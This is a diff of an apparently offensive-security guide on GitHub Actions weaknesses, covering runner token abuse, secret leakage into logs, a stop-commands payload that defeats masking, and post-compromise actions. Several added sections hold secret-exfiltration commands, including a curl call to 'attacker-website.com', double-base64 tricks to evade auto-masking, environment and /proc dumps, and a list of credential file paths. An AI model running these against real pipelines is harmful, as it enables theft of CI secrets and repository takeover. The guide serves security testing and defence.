@@ -217,7 +217,7 @@ GitHub Actions does not separate different [deployment environments](https://doc
 
 # GitHub Runner registration token disclosure
 
-GitHub Actions supports self-hosted runners that users can deploy to run jobs. The deployment process includes registering a self-hosted runner on the GitHub Service. [The self-hosted runner registration process](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners) is the exchange of a GitHub Runner registration token for a temporary JWT token, and the subsequent generation of an RSA key that will be used by a self-hosted runner in the future to issue JWT tokens. Therefore, the GitHub Service allows self-hosted runners to be registered based on the GitHub Runner registration token and subsequently identifies the self-hosted runner by its public key.
+GitHub Actions supports self-hosted runners that users can deploy to run jobs. The deployment process includes registering a self-hosted runner on the GitHub Service. [The self-hosted runner registration process](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners) is the exchange of a GitHub Runner registration token for a temporary JWT token and the subsequent generation of an RSA key that will be used by a self-hosted runner in the future to issue JWT tokens. Therefore, the GitHub Service allows self-hosted runners to be registered based on the GitHub Runner registration token and subsequently identifies the self-hosted runner by its public key.
 
 The GitHub Runner registration token is a short-term token that has a 1 hour expiration time and it looks like this:
 
@@ -225,9 +225,9 @@ The GitHub Runner registration token is a short-term token that has a 1 hour exp
 AUUYBYBGG5FM52VMJQPIF5DCNFBZA
 ```
 
-In the case of a GitHub Runner registration token disclosure, an attacker can register a malicious runner, takeover jobs, and gain full access to secrets and code.
+In the case of a GitHub Runner registration token disclosure, an attacker can register a malicious runner, take over jobs, and gain full access to secrets and code.
 
-You can use the next request to check a registration token (or):
+You can use the next request to check a registration token:
 
 ```http
 POST /actions/runner-registration HTTP/1.1
@@ -246,7 +246,7 @@ For further exploitation follow the "[Adding self-hosted runners](https://docs.g
 
 # Disclosure of sensitive data
 
-GitHub Actions write all details about a run to workflow logs, which include all running commands and their outputs. Logs of the public projects are available for everyone, and in sensitive data gets into the logs, everyone will be able to access this data. The same applies to [byproducts of workflow execution](https://docs.github.com/en/actions/advanced-guides).
+GitHub Actions write all details about a run to workflow logs, which include all running commands and their outputs. Logs of the public projects are available for everyone, and in sensitive data gets into the logs, everyone can access this data. The same applies to [byproducts of workflow execution](https://docs.github.com/en/actions/advanced-guides).
 
 References:
 - [GitHub Docs: Security hardening - Using secrets](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-secrets)
@@ -281,7 +281,7 @@ The following example does not mark `TOKEN` as sensitive using `add-mask` and `c
     curl -i -H "PRIVATE-TOKEN: $TOKEN" https://api.website.com
 ```
 
-Remember that if you can control the variables that are printed in the workflow logs and there is a step that uses `add-mask` to mark new sensitive data, you can disable `add-mask` injection the [stop-commands](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) workflow command into the log.
+Remember that if you can control the variables that are printed in the workflow logs and there is a step that uses `add-mask` to mask new sensitive data, you can disable `add-mask` by injecting the [stop-commands](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) command into the workflow log.
 
 In the snippet below, an attacker could use the pull request description to deliver a payload and stop workflow command processing, which will cause the token to be exposed despite the `add-mask` being used.
 
@@ -301,40 +301,11 @@ The payload may look like this:
 \n::stop-commands::randomtoken\n
 ```
 
-## Output parameters and debug mode
+## Misuse of secrets in reusable workflows
 
-All [output parameters](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-output-parameter) not marked as sensitive will be logged if the [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled.
+When a job is used to call a reusable workflow, `jobs.<job_id>.secrets` can be used to provide a map of secrets that are passed to the called workflow. Under certain circumstances, the misuse of secrets can lead to the disclosure of sensitive data.
 
-The following example will leak the tokens into the workflow logs if the `debug` mode is enabled:
-
-```yaml
-- run: |
-    # set output using deprecated set-output command
-    echo "::set-output name=token::$(./get_token)"
-    # set output using $GITHUB_OUTPUT file
-    echo "token=$(./get_token)" >> $GITHUB_OUTPUT
-```
-
-The workflow log discloses the token in plaintext:
-
-```
-::set-output name=token::cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU
-Warning: The `set-output` command is deprecated and will be disabled soon. Please upgrade to using Environment Files. For more information see: https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/
-##[debug]='cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU'
-##[debug]Set output token = uFlZdXxx5d2jXbTitxpq1FY8WsZTWtadcuFlZd
-```
-
-## Workflow artifacts
-
-[Artifacts](https://docs.github.com/en/actions/advanced-guides/storing-workflow-data-as-artifacts) in the public repositories are available to everyone for a retention period (90 days by default). Therefore, if sensitive data is leaked into artifacts, an attacker can [download](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts) them and the sensitive data inside.
-
-## Workflow cache
-
-Unlike artifacts, the [cache](https://docs.github.com/en/actions/advanced-guides/caching-dependencies-to-speed-up-workflows) is only available while a workflow is running. However, anyone with read access can create a pull request on a repository and access the contents of the cache. Forks can also create pull requests on the base branch and access caches on the base branch.
-
-## workflow_call secrets misusing
-
-When a job is used to call a reusable workflow, `jobs.<job_id>.secrets` can be used to provide a map of secrets that are passed to the called workflow. Under certain circumstances, the misuse of secrets can lead to the disclosure of sensitive data. Consider the following workflows:
+Consider the following workflows:
 
 ```yaml
 # dispatch.yml
@@ -380,7 +351,7 @@ jobs:
         shell: python
 ```
 
-As can be seen, the `dispatch.yml` workflow invokes the `reusable.yml` reusable workflow and passes `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` using the `creds` secrets. The `reusable.yml` workflow parses the `creds` secrets and extracts the `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY`. Even though `${{ secrets.creds }}` is masked in the logs, and `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY` are stored in encrypted secrets, `reusable.yml` will reveal the ID and key in plain text.
+The `dispatch.yml` workflow invokes the `reusable.yml` reusable workflow and passes `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` using the `creds` secrets. The `reusable.yml` workflow parses the `creds` secrets and extracts the `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY`. Even though `${{ secrets.creds }}` is masked in the logs, and `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY` are stored in encrypted secrets, `reusable.yml` will reveal the ID and key in plain text.
 
 It happens because [by default reusable workflows do not have access to the encrypted secrets](https://docs.github.com/en/enterprise-cloud@latest/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idsecretsinherit) and secrets must be defined via the `jobs.<job_id>.secrets`. As a result, if some sensitive data is extracted from the passed secrets, as in the example above, it can lead to their leakage into the workflow log.
 
@@ -423,6 +394,62 @@ jobs:
           build-args: ${{ secrets.build_args }}
           # ...
 ```
+
+## Misuse of secrets in manual workflows
+
+If the `workflow_dispacth` workflow receives secrets in the `inputs` context and does not mask them, with a high degree of probability the secrets will leak into the workflow log.
+
+For example, the following workflow gets a token from the `inputs` context and reveals that token in the workflow log, passing the token to environment variables:
+
+```yaml
+name: Release
+
+on:
+  workflow_dispatch:
+    inputs:
+      token:
+        description: 'API Token'
+        required: true
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./release.sh
+        env:
+          API_TOKEN: ${{ inputs.token }}
+```
+
+## Output parameters and debug mode
+
+All [output parameters](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-output-parameter) not marked as sensitive will be logged if the [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled.
+
+The following example will leak the tokens into the workflow logs if the `debug` mode is enabled:
+
+```yaml
+- run: |
+    # set output using deprecated set-output command
+    echo "::set-output name=token::$(./get_token)"
+    # set output using $GITHUB_OUTPUT file
+    echo "token=$(./get_token)" >> $GITHUB_OUTPUT
+```
+
+The workflow log discloses the token in plaintext:
+
+```
+::set-output name=token::cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU
+Warning: The `set-output` command is deprecated and will be disabled soon. Please upgrade to using Environment Files. For more information see: https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/
+##[debug]='cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU'
+##[debug]Set output token = uFlZdXxx5d2jXbTitxpq1FY8WsZTWtadcuFlZd
+```
+
+## Workflow artifacts
+
+[Artifacts](https://docs.github.com/en/actions/advanced-guides/storing-workflow-data-as-artifacts) in the public repositories are available to everyone for a retention period (90 days by default). Therefore, if sensitive data is leaked into artifacts, an attacker can [download](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts) them and the sensitive data inside.
+
+## Workflow cache
+
+Unlike artifacts, the [cache](https://docs.github.com/en/actions/advanced-guides/caching-dependencies-to-speed-up-workflows) is only available while a workflow is running. However, anyone with read access can create a pull request on a repository and access the contents of the cache. Forks can also create pull requests on the base branch and access caches on the base branch.
 
 # Contexts misusing
 
@@ -585,6 +612,7 @@ However, if a cloud provider is misconfigured, untrusted repositories can reques
 References:
 - [GitHub Docs: About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
 - [Identifying vulnerabilities in GitHub Actions & AWS OIDC Configurations](https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8)
+- [From GitHub To Account Takeover: Misconfigured Actions Place GCP & AWS Accounts At Risk](https://www.rezonate.io/blog/github-misconfigurations-put-gcp-aws-in-account-takeover-risk/)
 
 # Misuse of the events related to incoming pull requests
 
@@ -719,7 +747,7 @@ jobs:
           npm build
 ```
 
-As can be seen, the workflow is triggered when the `approved` label is set on a pull request. In other words, only a maintainer with write permissions can manually trigger this workflow. However, the workflow is still vulnerable, because it uses `github.event.pull_request.head.ref` to check out the repository content. Consider the difference between `head.ref` and `head.sha`. `head.ref` points to a branch while `head.sha` points to a commit. This means that if `head.sha` is used to check out a repository, the content will be fetched from the commit that was used to trigger the workflow. In the case of labeling a pull request, it will be the HEAD commit that was reviewed by a maintainer before the label was set. However, if `head.ref` is used, a repository is checked out from the base branch. As a result, an attacker can inject a malicious payload right after the manual approval. The attack flow may look like this:
+As can be seen, the workflow is triggered when the `approved` label is set on a pull request. In other words, only a maintainer with write permissions can manually trigger this workflow. However, the workflow is still vulnerable, because it uses `github.event.pull_request.head.ref` to check out the repository content. Consider the difference between `head.ref` and `head.sha`. `head.ref` points to a branch while `head.sha` points to a commit. This means that if `head.sha` is used to check out a repository, the content will be fetched from the commit that was used to trigger the workflow. In the case of labeling a pull request, it will be the HEAD commit that was reviewed by a maintainer before the label was set. However, if `head.ref` is used, a repository is checked out from the base branch. As a result, an attacker can inject a malicious payload right after the manual approval (TOCTOU attack). The attack flow may look like this:
 
 1. An attacker forks a target repository.
 1. An attacker makes valid changes and opens a pull request.
@@ -1444,9 +1472,7 @@ if: |
 
 Make sure all these users exist as they may have already been deleted or misspelled.
 
-# Potential impact of a compromised runner workflow
-
-## Accessing secrets
+# The potential impact of a compromised runner workflow
 
 Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` or `push`, where you could attempt to steal repository secrets or use the write permission of the job's [GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#about-the-github_token-secret).
 
@@ -1460,24 +1486,24 @@ References:
 - [GitHub Docs: Environment variables - Default environment variables](https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables)
 - [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#accessing-secrets)
 
-### Environment variables
+## Accessing secrets through environment variables
 
-If a secret is passed to an environment variable, you can directly access it in the following ways:
+If secrets are passed to an environment variable, you can directly access them in the following ways:
 
 ```bash
 # you can intentionally sent secrets to the logs with echo command
 $ echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};
-# or using base64
+# or using base64 (you need encode twice to avoid auto-masking)
 $ echo "${SOME_SECRET}" | base64 -w0 | base64 -w0
 # you can exfiltrate secrets with curl command
 $ curl "https://attacker-website.com/?secret=${SOME_SECRET}"
-# use printenv to dump environament variables
-$ printenv | base64 -w0 
-# same as printenv but via proc fs
-$ cat /proc/self/environ | base64 -w0
+# use printenv to dump environament variables (you need encode twice to avoid auto-masking)
+$ printenv | base64 -w0 | base64 -w0 
+# same as printenv but via proc fs (you need encode twice to avoid auto-masking)
+$ cat /proc/self/environ | base64 -w0 | base64 -w0
 ```
 
-### Shell scripts
+## Accessing secrets from the run: step
 
 If a secret is used directly in an expression `${{ }}` in the `run:` block, like:
     
@@ -1495,7 +1521,7 @@ $ cat /home/runner/work/_temp/$(xxd -r -p <<< 2a) | base64 -w0 | base64 -w0
 
 Note that this behavior is independent of [shell settings](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsshell).
 
-### Rewriting third-party actions
+## Accessing secrets through rewriting third-party actions
 
 If you have an arbitrary command execution in front of a third-party action that handles secrets:
 
@@ -1526,24 +1552,7 @@ runs:
       shell: bash
 ```
 
-### Abusing third-party actions
-
-Third-party actions may use secrets obtained from the arguments inappropriately and leak them into the workflow log or save them to disk.
-
-```yaml
-# save the PUBLISH_KEY to the .fakeaction file
-- uses: fakeaction/publish@v3
-  with:
-    key: ${{ secrets.PUBLISH_KEY }}
-# read PUBLISH_KEY from .fakeaction using a command injection
-# like: cat .fakeaction | base64 -w 0 | base64 -w 0
-- run: |
-    <COMMAND_INJECTION_HERE>
-```
-
-Check out the "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)" section.
-
-### Leaking repository and organization secrets by adding a malicious workflow
+## Leaking repository and organization secrets by adding a malicious workflow
 
 {% hint style="warning" %}
 GitHub no longer allows modifying files in the `.github/workflows` folder or merging a branch from **forks** with changes in the `.github/workflows` folder using `GITHUB_TOKEN`.
@@ -1571,7 +1580,8 @@ Usually, non-default branches have no branch protection rules. If you have acces
 1. Merge the pull request using `GITHUB_TOKEN` with `pull_requests:write` scope:
 
     ```bash
-    curl -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/<OWNER>/<REPO>/pulls/<PR_NUMBER>/merge
+    curl -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" \
+      https://api.github.com/repos/<OWNER>/<REPO>/pulls/<PR_NUMBER>/merge
     ```
 
 1. After merging the pull request open a pull request to the non-default branch from the fork.
@@ -1581,13 +1591,42 @@ Usually, non-default branches have no branch protection rules. If you have acces
 If `GITHUB_TOKEN` has the `contents:write` scope, you can create a new non-default branch using the following API request:
 
 ```bash
-curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/OWNER/REPO/git/refs -d '{"ref":"refs/heads/featureA","sha":"aa218f56b14c9653891f9e74264a383fa43fefbd"}'
+curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" \
+  https://api.github.com/repos/OWNER/REPO/git/refs \
+  -d '{"ref":"refs/heads/featureA","sha":"aa218f56b14c9653891f9e74264a383fa43fefbd"}'
 ```
+
+## Exfiltrating secrets from a runner
+
+An attacker can exfiltrate any stored secrets or other data from a runner. Actions and scripts may store sensitive data on the filesystem:
+
+| Source | Path | Description |
+| --- | --- | --- |
+| [actions/checkout](https://github.com/actions/checkout) | `.git/config` | `actions/checkout` action by default stores the repository token in a `.git/config` file unless the `persist-credentials: false` argument is set |
+| [atlassian/gajira-login](https://github.com/atlassian/gajira-login) | `$HOME/.jira.d/credentials` | `gajira-login` action [stores](https://github.com/atlassian/gajira-login/blob/90a599561baaf8c05b080645ed73db7391c246ed/index.js#L50) the credentials in `credentials` |
+| [Azure/login](https://github.com/Azure/login) | `$HOME/.azure` | `Azure/login` action by default use the Azure CLI for login, that stores the credentials in `$HOME/.azure` folder |
+| [aws-actions/amazon-ecr-login](https://github.com/aws-actions/amazon-ecr-login) | `$HOME/.docker/config.json` | `aws-actions/amazon-ecr-login` [invokes](https://github.com/aws-actions/amazon-ecr-login/blob/4831715c8c81dbf2ae795f9e285de2a9ee1150b4/index.js#L48) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
+| [docker/login-action](https://github.com/docker/login-action) | `$HOME/.docker/config.json` | `docker/login-action` [invokes](https://github.com/docker/login-action/blob/3a136a8631bbc4ca05cc2f33d3a19059e9255bae/src/main.ts#L11) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
+| [docker login](https://docs.docker.com/engine/reference/commandline/login/) | `$HOME/.docker/config.json` | `docker-login` [stores](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) credentials in `.docker/config.json` file |
+| [google-github-actions/auth](https://github.com/google-github-actions/auth) | `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` | [google-github-actions/auth](https://github.com/google-github-actions/auth) action by default [stores](https://github.com/google-github-actions/auth/blob/b258a9f230b36c9fa86dfaa43d1906bd76399edb/src/client/credentials_json_client.ts#127) the credentials in a `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` file unless the `create_credentials_file: false` argument is set |
+| [hashicorp/setup-terraform](https://github.com/hashicorp/setup-terraform) | `$HOME/.terraformrc` | `hashicorp/setup-terraform` action by default [stores](https://github.com/hashicorp/setup-terraform/blob/8b4c280fc8c755f3640ce104b5ba443608256909/lib/setup-terraform.js#L104) credentials in a `.terraformrc` file |
+
+## Exfiltrating secrets from memory
+
+Any secrets that are used by a workflow are passed to the GitHub Runner at startup; therefore secrets are placed in the process's memory. You can try to exfiltrate secrets from the memory dump.
+
+{% hint style="info" %}
+`GITHUB_TOKEN` is always passed to the runner, even if it is not referenced in a workflow or included action.
+{% endhint %}
+
+You can use the following script to dump the memory and find `GITHUB_TOKEN`:
+
+{% embed url="https://gist.github.com/nikitastupin/30e525b776c409e03c2d6f328f254965" %}
 
 ## Approving pull requests
 
 {% hint style="info" %}
-[As of May 2022](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/), creating and approving pull requests by GitHub Actions is disabled for all new repositories and organizations by default. Please, check out [GitHub Docs: Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
+[As of May 2022](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/), creating and approving pull requests by GitHub Actions is disabled for all new repositories and organizations by default, check out [GitHub Docs: Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
 {% endhint %}
 
 You can grant write permissions on the pull requests API endpoint and use the API to approve a pull request. It can be used to bypass branch protection rules when a main branch requires 1 approval and does not require review from code owners.
@@ -1607,28 +1646,6 @@ For instance, if you can write to non-main branches of a repository, you can byp
 
 - [Writeup: Bypassing required reviews using GitHub Actions](https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7)
 
-## Exfiltrating data from a runner
-
-An attacker can exfiltrate any stored secrets or other data from a runner. Actions and scripts may store sensitive data on the disk:
-
-| Source | Path | Description |
-| --- | --- | --- |
-| [actions/checkout](https://github.com/actions/checkout) | `.git/config` | `actions/checkout` action by default stores the repository token in a `.git/config` file unless the `persist-credentials: false` argument is set |
-| [atlassian/gajira-login](https://github.com/atlassian/gajira-login) | `$HOME/.jira.d/credentials` | `gajira-login` action [stores](https://github.com/atlassian/gajira-login/blob/90a599561baaf8c05b080645ed73db7391c246ed/index.js#L50) the credentials in `credentials` |
-| [Azure/login](https://github.com/Azure/login) | `$HOME/.azure` | `Azure/login` action by default use the Azure CLI for login, that stores the credentials in `$HOME/.azure` folder |
-| [aws-actions/amazon-ecr-login](https://github.com/aws-actions/amazon-ecr-login) | `$HOME/.docker/config.json` | `aws-actions/amazon-ecr-login` [invokes](https://github.com/aws-actions/amazon-ecr-login/blob/4831715c8c81dbf2ae795f9e285de2a9ee1150b4/index.js#L48) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
-| [docker/login-action](https://github.com/docker/login-action) | `$HOME/.docker/config.json` | `docker/login-action` [invokes](https://github.com/docker/login-action/blob/3a136a8631bbc4ca05cc2f33d3a19059e9255bae/src/main.ts#L11) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
-| [docker login](https://docs.docker.com/engine/reference/commandline/login/) | `$HOME/.docker/config.json` | `docker-login` [stores](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) credentials in `.docker/config.json` file |
-| [google-github-actions/auth](https://github.com/google-github-actions/auth) | `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` | [google-github-actions/auth](https://github.com/google-github-actions/auth) action by default [stores](https://github.com/google-github-actions/auth/blob/b258a9f230b36c9fa86dfaa43d1906bd76399edb/src/client/credentials_json_client.ts#127) the credentials in a `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` file unless the `create_credentials_file: false` argument is set |
-| [hashicorp/setup-terraform](https://github.com/hashicorp/setup-terraform) | `$HOME/.terraformrc` | `hashicorp/setup-terraform` action by default [stores](https://github.com/hashicorp/setup-terraform/blob/8b4c280fc8c755f3640ce104b5ba443608256909/lib/setup-terraform.js#L104) credentials in a `.terraformrc` file |
-
-Any secrets that are used by a workflow are passed to the GitHub Runner at startup; therefore secrets are placed in the process's memory. Although GitHub Actions scrub secrets from memory that are not referenced in the workflow or an included action, `GITHUB_TOKEN` is always passed to the Runner. You can try to exfiltrate secrets from the memory dump. For example, the following script dumps the memory and finds `GITHUB_TOKEN`:
-
-{% embed url="https://gist.github.com/nikitastupin/30e525b776c409e03c2d6f328f254965" %}
-
-References:
-- [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#exfiltrating-data-from-a-runner)
-
 ## Modifying the contents of a repository
 
 An attacker can use the GitHub API to [modify repository content](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token), including releases if the assigned permissions of `GITHUB_TOKEN` [are not restricted](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token).
@@ -1636,11 +1653,75 @@ An attacker can use the GitHub API to [modify repository content](https://docs.g
 References:
 - [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#modifying-the-contents-of-a-repository)
 
-## Access cloud services via OIDC
+## Access cloud services via OpenID Connect
 
-If a vulnerable workflow has the `id-token:write` scope you can request the OIDC JWT ID token to access cloud resources.
+If a vulnerable workflow has the `GITHUB_TOKEN` with the `id-token:write` scope you can request the OIDC JWT ID token to access cloud resources.
 
 References:
 
 - [Github Docs: Security hardening your deployments - About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
 - [Deploy without credentials with GitHub Actions and OIDC](https://blog.alexellis.io/deploy-without-credentials-using-oidc-and-github-actions/)
+
+## Trigger workflow_dispatch workflows
+
+`GITHUB_TOKEN` with the `actions:write` scope can be used to [create a workflow dispatch event](https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event) via API. It allows triggering workflows using the [workflow_dispacth](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_dispatch) event and expanding the attack surface.
+
+```bash
+curl -i -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" \
+  https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/dispatches \
+  -d '{"ref":"main","inputs":{"name":"Mona the Octocat","home":"San Francisco, CA"}}'
+```
+
+In the request above, you can control workflow arguments using the `inputs` parameter. If a workflow does not properly handle data from the `inputs` context, you might get the command execution.
+
+```yaml
+on:
+  workflow_dispatch:
+    inputs:
+      token:
+        description: 'API Token'
+        required: true
+
+jobs:
+  manual:
+    runs-on: ubuntu-latest
+    steps:
+      # you can use the token parameter to inject arbitrary commands to the run: step
+      - run: |
+          curl -H "API-Token: ${{ inputs.token }}"
+```
+
+References:
+- [GitHub Actions: Use the GITHUB_TOKEN with workflow_dispatch and repository_dispatch](https://github.blog/changelog/2022-09-08-github-actions-use-github_token-with-workflow_dispatch-and-repository_dispatch/)
+
+## Trigger repository_dispatch workflows
+
+`GITHUB_TOKEN` with the `metadata:read` and `contents:read&write` scopes can be used to [create a repository dispatch event](https://docs.github.com/en/rest/repos/repos?apiVersion=2022-11-28#create-a-repository-dispatch-event) via API. It allows triggering workflows using the [repository_dispatch](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#repository_dispatch) event and expanding the attack surface.
+
+```bash
+curl -i -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>"\
+  https://api.github.com/repos/OWNER/REPO/dispatches \
+  -d '{"event_type":"on-demand-test","client_payload":{"unit":false,"integration":true}}'
+```
+
+In the request above, you can control workflow arguments using the `client_payload` parameter. If a workflow does not properly handle data from the `github.event.client_payload` context, you might get the command execution.
+
+```yaml
+name: Manual
+
+on:
+  repository_dispatch:
+    types: [test_result]
+
+jobs:
+  run_if_failure:
+    if: ${{ !github.event.client_payload.passed }}
+    runs-on: ubuntu-latest
+    steps:
+      # you can use the message parameter to inject arbitrary commands to the run: step
+      - run: |
+          echo ${{ github.event.client_payload.message }}
+```
+
+References:
+- [GitHub Actions: Use the GITHUB_TOKEN with workflow_dispatch and repository_dispatch](https://github.blog/changelog/2022-09-08-github-actions-use-github_token-with-workflow_dispatch-and-repository_dispatch/)
